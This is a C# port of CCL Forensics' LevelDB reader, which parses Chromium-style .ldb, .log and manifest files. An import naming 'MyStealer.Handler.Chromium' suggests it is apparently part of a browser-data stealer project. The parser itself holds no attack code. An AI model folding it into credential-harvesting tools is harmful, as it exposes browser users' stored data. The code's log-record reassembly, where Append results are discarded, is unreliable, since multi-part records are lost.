// 
// Copyright 2020-2021, CCL Forensics
// 
// Permission is hereby granted, free of charge, to any person obtaining a copy of
// this software and associated documentation files (the "Software"), to deal in
// the Software without restriction, including without limitation the rights to
// use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies
// of the Software, and to permit persons to whom the Software is furnished to do
// so, subject to the following conditions:
// 
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
// 
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.
// 
using System.Collections.Generic;
using System;
using System.Linq;
using System.IO;
using System.Collections;
using System.Globalization;
using System.Text.RegularExpressions;
using System.Text;
using MyStealer.Handler.Chromium.LevelDb;
using Serilog;
using Snappy;
using System.Runtime.Remoting.Messaging;

/// <summary>
/// Ported from ccl_leveldb.py using pytocs 2.0.0-3150cbcd42
/// Check https://github.com/cclgroupltd/ccl_chrome_indexeddb for the original source
/// 
/// Version: 0.4
/// Description: A module for reading LevelDB databases
/// Contact: Alex Caithness
/// </summary>
public static class CclLevelDb
{
    public static (int, byte[]) _read_le_varint(Stream stream, bool is_google_32bit = false)
    {
        // this only outputs unsigned
        var i = 0;
        var result = 0;
        var limit = is_google_32bit ? 5 : 10;
        var underlying_bytes = new List<byte>(limit);
        while (i < limit)
        {
            var raw = stream.ReadByte();
            if (raw < 0)
                return (0, Array.Empty<byte>());
            underlying_bytes.Add((byte)raw);
            result |= (raw & 0x7f) << i * 7;
            if ((raw & 0x80) == 0)
                break;
            i++;
        }
        return (result, underlying_bytes.ToArray());
    }

    // Convenience version of _read_le_varint that only returns the value or None (if None, return 0)
    public static int read_le_varint(Stream stream, bool is_google_32bit = false)
    {
        var x = _read_le_varint(stream, is_google_32bit: is_google_32bit);
        return x.Item1;
    }

    // Reads a blob of data which is prefixed with a varint length
    public static byte[] read_length_prefixed_blob(Stream stream)
    {
        var length = read_le_varint(stream);
        var buffer = new byte[length];
        var read = stream.Read(buffer, 0, length);
        if (read != length)
        {
            throw new Exception($"Could not read all data (expected {length}, got {read}");
        }
        return buffer;
    }

    // See: https://github.com/google/leveldb/blob/master/doc/table_format.md
    //     A BlockHandle contains an offset and length of a block in an ldb table file
    public class BlockHandle
    {

        public int offset;

        public int length;

        public BlockHandle(int offset, int length)
        {
            this.offset = offset;
            this.length = length;
        }

        public static BlockHandle from_stream(Stream stream)
        {
            return new BlockHandle(read_le_varint(stream), read_le_varint(stream));
        }

        public static BlockHandle from_bytes(byte[] data)
        {
            using (var stream = new MemoryStream(data))
            {
                return from_stream(stream);
            }
        }
    }

    // Raw key, value for a record in a LDB file Block, along with the offset within the block from which it came from
    //     See: https://github.com/google/leveldb/blob/master/doc/table_format.md
    public class RawBlockEntry
    {
        public byte[] key;

        public byte[] value;

        public long block_offset;

        public RawBlockEntry(byte[] key, byte[] value, long block_offset)
        {
            this.key = key;
            this.value = value;
            this.block_offset = block_offset;
        }
    }

    public enum FileType
    {
        Ldb = 1,

        Log = 2
    }

    public enum KeyState
    {
        Deleted = 0,

        Live = 1,

        Unknown = 2
    }

    // A record from leveldb; includes details of the origin file, state, etc.
    public class Record
    {
        public byte[] key;

        public byte[] value;

        public ulong seq;

        public KeyState state;

        public FileType file_type;

        public string origin_file;

        public long offset;

        public bool was_compressed;

        public Record(byte[] key, byte[] value, ulong seq, KeyState state, FileType file_type, string origin_file, long offset, bool was_compressed)
        {
            this.key = key;
            this.value = value;
            this.seq = seq;
            this.state = state;
            this.file_type = file_type;
            this.origin_file = origin_file;
            this.offset = offset;
            this.was_compressed = was_compressed;
        }

        // Returns the "userkey" which omits the metadata bytes which may reside at the end of the raw key
        public byte[] user_key
        {
            get
            {
                if (file_type == FileType.Ldb && key.Length >= 8)
                {
                    var buffer = new byte[key.Length - 8];
                    Buffer.BlockCopy(key, 0, buffer, 0, buffer.Length);
                    return buffer;
                }

                return key;
            }
        }

        public static Record ldb_record(byte[] key, byte[] value, string origin_file, long offset, bool was_compressed)
        {
            var state = KeyState.Unknown;

            // seq = (struct.unpack("<Q", key[-8:])[0]) >> 8
            var seq = key.ToLeUInt64(key.Length - 8) >> 8;

            if (key.Length > 8)
                state = key[key.Length - 8] == 0 ? KeyState.Deleted : KeyState.Live;

            return new Record(key, value, seq, state, FileType.Ldb, origin_file, offset, was_compressed);
        }

        public static Record log_record(byte[] key, byte[] value, ulong seq, KeyState state, string origin_file, long offset) => new Record(key, value, seq, state, FileType.Log, origin_file, offset, false);
    }

    // Block from an .lldb (table) file. See: https://github.com/google/leveldb/blob/master/doc/table_format.md
    public class Block : IEnumerable<RawBlockEntry>
    {

        public byte[] _raw;

        public int _restart_array_offset;

        public int _restart_array_count;

        public int offset;

        public LdbFile origin;

        public bool was_compressed;

        public Block(byte[] raw, bool was_compressed, LdbFile origin, int offset)
        {
            _raw = raw;
            this.was_compressed = was_compressed;
            this.origin = origin;
            this.offset = offset;
            // _restart_array_count = @struct.unpack("<I", _raw[^4])[0];
            _restart_array_count = (int)_raw.ToLeUInt32(_raw.Length - 4);
            _restart_array_offset = _raw.Length - (_restart_array_count + 1) * 4;
        }

        public virtual int get_restart_offset(int index)
        {
            var offset = _restart_array_offset + index * 4;
            //return @struct.unpack("<i", _raw[offset: (offset + 4):])[0];
            return _raw.ToLeInt32(offset);
        }

        public virtual int get_first_entry_offset()
        {
            return get_restart_offset(0);
        }

        public IEnumerator<RawBlockEntry> GetEnumerator()
        {
            var offset = get_first_entry_offset();
            using (var stream = new MemoryStream(_raw))
            {
                stream.Seek(offset, SeekOrigin.Begin);
                var key = Array.Empty<byte>();
                while (stream.Position < _restart_array_offset)
                {
                    var start_offset = stream.Position;
                    var shared_length = read_le_varint(stream, is_google_32bit: true);
                    var non_shared_length = read_le_varint(stream, is_google_32bit: true);
                    var value_length = read_le_varint(stream, is_google_32bit: true);

                    // sense check
                    if (offset >= _restart_array_offset)
                        throw new IndexOutOfRangeException("Reading start of entry past the start of restart array");
                    if (shared_length > key.Length)
                        throw new IndexOutOfRangeException("Shared key length is larger than the previous key");

                    // key = key[:shared_length] + buff.read(non_shared_length)
                    var keyBuffer = new byte[shared_length + non_shared_length];
                    Buffer.BlockCopy(key, 0, keyBuffer, 0, shared_length);
                    stream.Read(keyBuffer, shared_length, non_shared_length);
                    key = keyBuffer;

                    var value = new byte[value_length];
                    stream.Read(value, 0, value_length);
                    yield return new RawBlockEntry(key, value, start_offset);
                }
            }
        }

        IEnumerator IEnumerable.GetEnumerator() => GetEnumerator();
    }

    // A leveldb table (.ldb or .sst) file.
    public class LdbFile : DataFile
    {

        public (byte[], BlockHandle)[] _index;

        public BlockHandle _index_handle;

        public BlockHandle _meta_index_handle;

        public static readonly int BLOCK_TRAILER_SIZE = 5;

        public static readonly long FOOTER_SIZE = 48;

        public static readonly ulong MAGIC = 0xdb4775248b80fb57;

        public LdbFile(string file)
        {
            if (!File.Exists(file))
            {
                throw new FileNotFoundException(file);
            }
            path = file;
            file_no = int.Parse(Path.GetFileNameWithoutExtension(file), NumberStyles.HexNumber);
            _f = File.Open(file, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
            _f.Seek(-FOOTER_SIZE, SeekOrigin.End);
            _meta_index_handle = BlockHandle.from_stream(_f);
            _index_handle = BlockHandle.from_stream(_f);
            _f.Seek(-8, SeekOrigin.End);

            var buffer = new byte[8];
            _f.Read(buffer, 0, 8);
            var magic = buffer.ToLeUInt64();
            if (magic != LdbFile.MAGIC)
                throw new Exception($"Invalid magic number in {file}");
            _index = _read_index();
        }

        public virtual Block _read_block(BlockHandle handle)
        {
            // block is the size in the blockhandle plus the trailer
            // the trailer is 5 bytes long.
            // idx  size  meaning
            // 0    1     CompressionType (0 = none, 1 = snappy)
            // 1    4     CRC32
            _f.Seek(handle.offset, SeekOrigin.Begin);

            var raw_block = _f.ReadBytes(handle.length);
            var trailer = _f.ReadBytes(BLOCK_TRAILER_SIZE);
            if (raw_block.Length != handle.length || trailer.Length != BLOCK_TRAILER_SIZE)
                throw new Exception($"Could not read all of the block at offset {handle.offset} in file {path}");

            var is_compressed = trailer[0] != 0;
            if (is_compressed)
            {
                var buffer = new byte[SnappyCodec.GetUncompressedLength(raw_block, 0, raw_block.Length)];
                var written = SnappyCodec.Uncompress(raw_block, 0, raw_block.Length, buffer, 0);
                if (written != buffer.Length)
                    throw new Exception("Snappy decompression length mismatched");

                raw_block = buffer;
            }
            return new Block(raw_block, is_compressed, this, handle.offset);
        }

        public virtual (byte[], BlockHandle)[] _read_index()
        {
            var index_block = _read_block(_index_handle);

            // key is earliest key, value is BlockHandle to that data block
            return (from entry in index_block
                    select (entry.key, BlockHandle.from_bytes(entry.value))).ToArray();
        }

        // Iterate Records in this Table file
        public override IEnumerator<Record> GetEnumerator()
        {
            foreach (var blockEntry in _index)
            {
                var block = this._read_block(blockEntry.Item2);
                foreach (var entry in block)
                {
                    yield return Record.ldb_record(entry.key, entry.value, path, block.was_compressed ? block.offset : block.offset + entry.block_offset, block.was_compressed);
                }
            }
        }

        public override void Dispose() => _f.Dispose();
    }

    public enum LogEntryType
    {
        Zero = 0,

        Full = 1,

        First = 2,

        Middle = 3,

        Last = 4
    }

    public abstract class DataFile : IDisposable, IEnumerable<Record>
    {
        protected Stream _f;

        public int file_no;

        public string path;

        public abstract void Dispose();
        public abstract IEnumerator<Record> GetEnumerator();
        IEnumerator IEnumerable.GetEnumerator() => GetEnumerator();
    }

    // A levelDb log (.log) file
    public class LogFile : DataFile
    {
        public static readonly int LOG_ENTRY_HEADER_SIZE = 7;

        public static readonly int LOG_BLOCK_SIZE = 32768;

        public LogFile(string file)
        {
            if (!File.Exists(file))
                throw new FileNotFoundException(file);
            path = file;
            file_no = int.Parse(Path.GetFileNameWithoutExtension(file), NumberStyles.HexNumber);
            _f = File.Open(file, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
        }

        public virtual IEnumerable<byte[]> _get_raw_blocks()
        {
            byte[] chunk;
            _f.Seek(0, SeekOrigin.Begin);
            while ((chunk = _f.ReadBytes(LOG_BLOCK_SIZE)).Length == LogFile.LOG_BLOCK_SIZE)
            {
                yield return chunk;
            }
        }

        public virtual IEnumerable<(long, byte[])> _get_batches()
        {
            var in_record = false;
            var start_block_offset = 0L;
            var block = new byte[] { };
            var idx = -1;
            foreach (var chunk in _get_raw_blocks())
            {
                idx++;
                using (var buff = new MemoryStream(chunk))
                {
                    while (buff.Position < LOG_BLOCK_SIZE - 6)
                    {
                        var header = buff.ReadBytes(7);
                        if (header.Length < 7)
                            break;
                        // (crc, length, block_type) = @struct.unpack("<IHB", header);
                        if (chunk.Length - buff.Position < 8)
                            break;

                        var crc = header.ToLeUInt32();
                        var length = header.ToLeUInt16(4);
                        var block_type = (LogEntryType)header[6];

                        if (block_type == LogEntryType.Full)
                        {
                            if (in_record)
                                throw new Exception($"Full block whilst still building a block at offset {idx * LogFile.LOG_BLOCK_SIZE + buff.Position} in {path}");

                            in_record = false;
                            yield return (idx * LogFile.LOG_BLOCK_SIZE + buff.Position, buff.ReadBytes(length));
                        }
                        else if (block_type == LogEntryType.First)
                        {
                            if (in_record)
                                throw new Exception($"First block whilst still building a block at offset {idx * LogFile.LOG_BLOCK_SIZE + buff.Position} in {path}");

                            start_block_offset = idx * LogFile.LOG_BLOCK_SIZE + buff.Position;
                            block = buff.ReadBytes(length);
                            in_record = true;
                        }
                        else if (block_type == LogEntryType.Middle)
                        {
                            if (!in_record)
                                throw new Exception($"Middle block whilst not building a block at offset {idx * LogFile.LOG_BLOCK_SIZE + buff.Position} in {path}");

                            block.Append(buff.ReadBytes(length));
                        }
                        else if (block_type == LogEntryType.Last)
                        {
                            if (!in_record)
                                throw new Exception($"Last block whilst not building a block at offset {idx * LogFile.LOG_BLOCK_SIZE + buff.Position} in {path}");

                            block.Append(buff.ReadBytes(length));
                            in_record = false;
                            yield return (start_block_offset * LogFile.LOG_BLOCK_SIZE, block);
                        }
                        else
                        {
                            yield break;
                            //throw new Exception("Unexpected block type: " + block_type);
                        }
                    }
                }
            }
        }

        // Iterate Records in this Log file
        public override IEnumerator<Record> GetEnumerator()
        {
            foreach (var entry in _get_batches())
            {
                var batch_offset = entry.Item1;
                var batch = entry.Item2;

                // as per write_batch and write_batch_internal
                // offset       length      description
                // 0            8           (u?)int64 Sequence number
                // 8            4           (u?)int32 Count - the log batch can contain multple entries
                //
                //         Then Count * the following:
                //
                // 12           1           ValueType (KeyState as far as this library is concerned)
                // 13           1-4         VarInt32 length of key
                // ...          ...         Key data
                // ...          1-4         VarInt32 length of value
                // ...          ...         Value data
                using (var buff = new MemoryStream(batch))
                {
                    // it's just easier this way
                    //header = buff.ReadBytes(12);
                    //(seq, count) = @struct.unpack("<QI", header);
                    var seq = buff.ReadLeUInt64();
                    var count = buff.ReadLeUInt32();

                    for (var i = 0; i < count; i++)
                    {
                        var start_offset = batch_offset + buff.Position;
                        var state = (KeyState)buff.ReadByte();
                        var key_length = read_le_varint(buff, is_google_32bit: true);
                        var key = buff.ReadBytes(key_length);
                        byte[] value;
                        // print(key)
                        if (state != KeyState.Deleted)
                        {
                            var value_length = read_le_varint(buff, is_google_32bit: true);
                            value = buff.ReadBytes(value_length);
                        }
                        else
                        {
                            value = Array.Empty<byte>();
                        }
                        yield return Record.log_record(key, value, seq + (ulong)i, state, path, start_offset);
                    }
                }
            }
        }

        public override void Dispose() => _f.Dispose();
    }

    // 
    //     See: https://github.com/google/leveldb/blob/master/db/version_edit.cc
    //     
    public enum VersionEditTag
    {
        Comparator = 1,

        LogNumber = 2,

        NextFileNumber = 3,

        LastSequence = 4,

        CompactPointer = 5,

        DeletedFile = 6,

        NewFile = 7,

        PrevLogNumber = 9
    }

    // 
    //     See:
    //     https://github.com/google/leveldb/blob/master/db/version_edit.h
    //     https://github.com/google/leveldb/blob/master/db/version_edit.cc
    //     
    public class VersionEdit
    {
        public struct CompactionPointer
        {
            public int level;
            public byte[] pointer;
        }

        public struct DeletedFile
        {
            public int level, file_no;
        }

        public struct NewFile
        {
            public int level, file_no, file_size;
            public byte[] smallest_key, largest_key;
        }

        public IReadOnlyList<CompactionPointer> compaction_pointers;

        public string comparator;

        public IReadOnlyList<DeletedFile> deleted_files;

        public int last_sequence;

        public int log_number;

        public IReadOnlyList<NewFile> new_files;

        public int next_file_number;

        public int prev_log_number;

        public VersionEdit(string comparator, int log_number, int prev_log_number, int last_sequence, int next_file_number, IReadOnlyList<CompactionPointer> compaction_pointers, IReadOnlyList<DeletedFile> deleted_files, IReadOnlyList<NewFile> new_files)
        {
            this.comparator = comparator;
            this.log_number = log_number;
            this.prev_log_number = prev_log_number;
            this.last_sequence = last_sequence;
            this.next_file_number = next_file_number;
            this.compaction_pointers = compaction_pointers;
            this.deleted_files = deleted_files;
            this.new_files = new_files;
        }

        public static VersionEdit from_buffer(byte[] bytes)
        {
            string comparator = null;
            int log_number = 0;
            int prev_log_number = 0;
            int last_sequence = 0;
            int next_file_number = 0;
            var compaction_pointers = new List<CompactionPointer>();
            var deleted_files = new List<DeletedFile>();
            var new_files = new List<NewFile>();

            using (var b = new MemoryStream(bytes))
            {
                while (b.Position < bytes.Length - 1)
                {
                    var tag = (VersionEditTag)read_le_varint(b, is_google_32bit: true);
                    if (tag == VersionEditTag.Comparator)
                    {
                        comparator = Encoding.UTF8.GetString(read_length_prefixed_blob(b));
                    }
                    else if (tag == VersionEditTag.LogNumber)
                    {
                        log_number = read_le_varint(b);
                    }
                    else if (tag == VersionEditTag.PrevLogNumber)
                    {
                        prev_log_number = read_le_varint(b);
                    }
                    else if (tag == VersionEditTag.NextFileNumber)
                    {
                        next_file_number = read_le_varint(b);
                    }
                    else if (tag == VersionEditTag.LastSequence)
                    {
                        last_sequence = read_le_varint(b);
                    }
                    else if (tag == VersionEditTag.CompactPointer)
                    {
                        var level = read_le_varint(b, is_google_32bit: true);
                        var compaction_pointer = read_length_prefixed_blob(b);
                        compaction_pointers.Add(new CompactionPointer() { level = level, pointer = compaction_pointer });
                    }
                    else if (tag == VersionEditTag.DeletedFile)
                    {
                        var level = read_le_varint(b, is_google_32bit: true);
                        var file_no = read_le_varint(b);
                        deleted_files.Add(new DeletedFile() { level = level, file_no = file_no });
                    }
                    else if (tag == VersionEditTag.NewFile)
                    {
                        var level = read_le_varint(b, is_google_32bit: true);
                        var file_no = read_le_varint(b);
                        var file_size = read_le_varint(b);
                        var smallest = read_length_prefixed_blob(b);
                        var largest = read_length_prefixed_blob(b);
                        new_files.Add(new NewFile() { level = level, file_no = file_no, file_size = file_size, smallest_key = smallest, largest_key = largest });
                    }
                }
            }

            return new VersionEdit(comparator, log_number, prev_log_number, last_sequence, next_file_number, compaction_pointers, deleted_files, new_files);
        }
    }

    // 
    //     Represents a manifest file which contains database metadata.
    //     Manifest files are, at a high level, formatted like a log file in terms of the block and batch format,
    //     but the data within the batches follow their own format.
    // 
    //     Main use is to identify the level of files, use `file_to_level` property to look up levels based on file no.
    // 
    //     See:
    //     https://github.com/google/leveldb/blob/master/db/version_edit.h
    //     https://github.com/google/leveldb/blob/master/db/version_edit.cc
    //     
    public class ManifestFile : IDisposable, IEnumerable<VersionEdit>
    {

        public Stream _f;

        public int file_no;

        public IDictionary<int, int> file_to_level;

        public string path;

        public static readonly Regex MANIFEST_FILENAME_PATTERN = new Regex("MANIFEST-([0-9A-F]{6})", RegexOptions.Compiled);

        public ManifestFile(string path)
        {
            var fileName = Path.GetFileNameWithoutExtension(path);
            Match match;
            if ((match = MANIFEST_FILENAME_PATTERN.Match(fileName)) != null)
            {
                file_no = int.Parse(match.Groups[1].Value, NumberStyles.HexNumber);
            }
            else
            {
                throw new Exception("Invalid name for Manifest: " + fileName);
            }
            _f = File.Open(path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
            this.path = path;

            file_to_level = new Dictionary<int, int>();
            foreach (var edit in this)
            {
                foreach (var nf in edit.new_files)
                    file_to_level[nf.file_no] = nf.level;
            }
        }

        public virtual IEnumerable<byte[]> _get_raw_blocks()
        {
            byte[] chunk;
            _f.Seek(0, SeekOrigin.Begin);
            while ((chunk = _f.ReadBytes(LogFile.LOG_BLOCK_SIZE)).Length == LogFile.LOG_BLOCK_SIZE)
                yield return chunk;
        }

        // todo: it is duplicate with `LogFile`'s `_get_batches()`
        public virtual IEnumerable<(long, byte[])> _get_batches()
        {
            var in_record = false;
            var start_block_offset = 0L;
            var block = new byte[] { };
            var idx = -1;
            foreach (var chunk in _get_raw_blocks())
            {
                idx++;
                using (var buff = new MemoryStream(chunk))
                {
                    while (buff.Position < LogFile.LOG_BLOCK_SIZE - 6)
                    {
                        var header = buff.ReadBytes(7);
                        if (header.Length < 7)
                            break;
                        //(crc, length, block_type) = @struct.unpack("<IHB", header);

                        var crc = header.ToLeUInt32();
                        var length = header.ToLeUInt16(4);
                        var block_type = (LogEntryType)header[6];

                        if (block_type == LogEntryType.Full)
                        {
                            if (in_record)
                                throw new Exception("Full block whilst still building a block at offset {idx * LogFile.LOG_BLOCK_SIZE + buff.tell()} in {self.path}");

                            in_record = false;
                            yield return (idx * LogFile.LOG_BLOCK_SIZE + buff.Position, buff.ReadBytes(length));
                        }
                        else if (block_type == LogEntryType.First)
                        {
                            if (in_record)
                                throw new Exception("First block whilst still building a block at offset {idx * LogFile.LOG_BLOCK_SIZE + buff.tell()} in {self.path}");

                            start_block_offset = idx * LogFile.LOG_BLOCK_SIZE + buff.Position;
                            block = buff.ReadBytes(length);
                            in_record = true;
                        }
                        else if (block_type == LogEntryType.Middle)
                        {
                            if (!in_record)
                                throw new Exception("Middle block whilst not building a block at offset {idx * LogFile.LOG_BLOCK_SIZE + buff.tell()} in {self.path}");

                            block.Append(buff.ReadBytes(length));
                        }
                        else if (block_type == LogEntryType.Last)
                        {
                            if (!in_record)
                                throw new Exception("Last block whilst not building a block at offset {idx * LogFile.LOG_BLOCK_SIZE + buff.tell()} in {self.path}");

                            block.Append(buff.ReadBytes(length));
                            in_record = false;
                            yield return (start_block_offset * LogFile.LOG_BLOCK_SIZE, block);
                        }
                        else
                        {
                            yield break;
                            //throw new Exception("Unexpected block type: " + block_type);
                        }
                    }
                }
            }
        }

        public IEnumerator<VersionEdit> GetEnumerator()
        {
            foreach (var entry in this._get_batches())
            {
                yield return VersionEdit.from_buffer(entry.Item2);
            }
        }

        IEnumerator IEnumerable.GetEnumerator() => GetEnumerator();

        public void Dispose() => _f.Dispose();
    }

    public class RawLevelDb : IDisposable
    {

        public List<DataFile> _files;

        public string _in_dir;

        public ManifestFile manifest;

        public static readonly Regex DATA_FILE_PATTERN = new Regex(@"[0-9]{6}\.(ldb|log|sst)", RegexOptions.Compiled);

        public RawLevelDb(string in_dir)
        {
            if (!File.GetAttributes(in_dir).HasFlag(FileAttributes.Directory))
            {
                throw new IOException("in_dir is not a directory");
            }

            _in_dir = in_dir;

            _files = new List<DataFile>();

            var latest_manifest = (0, "");
            foreach (var file in Directory.EnumerateFiles(in_dir, "*", SearchOption.TopDirectoryOnly))
            {
                var fileName = Path.GetFileName(file);
                if (DATA_FILE_PATTERN.IsMatch(fileName))
                {
                    var fileExt = Path.GetExtension(file).ToLowerInvariant();
                    if (fileExt == ".log")
                    {
                        _files.Add(new LogFile(file));
                    }
                    else if (fileExt == ".ldb" || fileExt == ".sst")
                    {
                        _files.Add(new LdbFile(file));
                    }
                }

                var manifestMatch = ManifestFile.MANIFEST_FILENAME_PATTERN.Match(fileName);
                if (manifestMatch.Success)
                {
                    var manifest_no = int.Parse(manifestMatch.Groups[1].Value, NumberStyles.HexNumber);
                    if (latest_manifest.Item1 < manifest_no)
                        latest_manifest = (manifest_no, file);
                }
            }

            manifest = !string.IsNullOrEmpty(latest_manifest.Item2) ? new ManifestFile(latest_manifest.Item2) : null;
        }

        public string in_dir_path => _in_dir;

        public virtual IEnumerable<Record> iterate_records_raw(bool reverse = false)
        {
            foreach (var file_containing_records in _files.OrderBy(x => x.file_no))
            {
                foreach (var record in file_containing_records)
                    yield return record;
            }
        }

        public void Dispose()
        {
            foreach (var file in _files)
                file.Dispose();

            manifest?.Dispose();
        }
    }
}
